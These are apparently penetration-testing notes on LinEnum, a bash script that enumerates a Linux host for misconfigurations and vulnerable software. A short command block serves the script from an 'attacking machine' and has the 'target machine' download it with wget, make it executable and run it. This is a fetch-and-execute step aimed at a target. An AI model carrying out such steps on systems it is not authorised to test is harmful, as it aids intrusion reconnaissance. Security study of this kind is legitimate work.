
## General

LinEnum is a bash script designed to automate the process of searching for known vulnerabilities and misconfigurations on a Linux system. It can be used as a standalone tool or as part of a larger process to assess the security of a system. LinEnum performs a number of checks, including:

-   Enumerating the kernel and system information
-   Searching for files with potentially dangerous permissions
-   Checking for any installed software that is known to have vulnerabilities
-   Checking for misconfigurations that may allow an attacker to gain unauthorized access


## Commands

```
# Attacking Machine
python3 -m http.server

# Target Machine
wget http://IP/Name.sh
chmod +x NAME.sh
./NAME.sh
```
